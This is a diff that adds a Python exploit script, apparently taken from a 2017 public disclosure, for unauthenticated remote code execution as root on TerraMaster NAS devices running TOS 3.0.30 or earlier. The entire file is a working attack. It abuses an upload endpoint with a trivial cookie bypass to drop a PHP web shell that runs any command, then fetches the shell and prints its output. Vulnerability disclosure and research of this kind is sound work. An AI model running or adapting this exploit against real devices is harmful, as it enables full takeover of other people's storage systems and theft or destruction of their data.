@@ -1,0 +1,42 @@
+# Source: https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/
+
+#!/usr/bin/python
+# coding: utf8
+#
+# Exploit: Unauthenticated RCE as root.
+# Vendor: TerraMaster
+# Product: TOS <= 3.0.30 (running on every NAS)
+# Author: Simone 'evilsocket' Margaritelli <evilsocket@protonmail.com> 
+import sys
+import requests
+def upload( address, port, filename, path = '/usr/www/' ):
+    url = "http://%s:%d/include/upload.php?targetDir=%s" % ( address, port, path )
+    try:
+        files = { 'file': open( filename, 'rb' ) }
+        cookies = { 'kod_name': '1' } # LOL :D
+        r = requests.post(url, files=files, cookies=cookies)
+        if r.text != '{"jsonrpc" : "2.0", "result" : null, "id" : "id"}':
+            print "! Unexpected response, exploit might not work:\n%s\n" % r.text
+        return True
+    except Exception as e:
+        print "\n! ERROR: %s" % e
+    return False
+def rce( address, port, command ):
+    with open( '/tmp/p.php', 'w+t' ) as fp:
+        fp.write( "<?php system('%s'); ?>" % command )
+    if upload( address, port, '/tmp/p.php' ) == True:
+        try:
+            url = "http://%s:%d/p.php" % ( address, port )
+            return requests.get(url).text
+        except Exception as e:
+            print "\n! ERROR: %s" % e
+    return None
+if len(sys.argv) < 3:
+    print "Usage: exploit.py <ip|hostname> <command> (port=8181)\n"
+    quit()
+target  = sys.argv[1]
+command = sys.argv[2]
+port    = 8181 if len(sys.argv) < 4 else int(sys.argv[3])
+out = rce( target, port, command )
+if out is not None:
+    print out.strip()
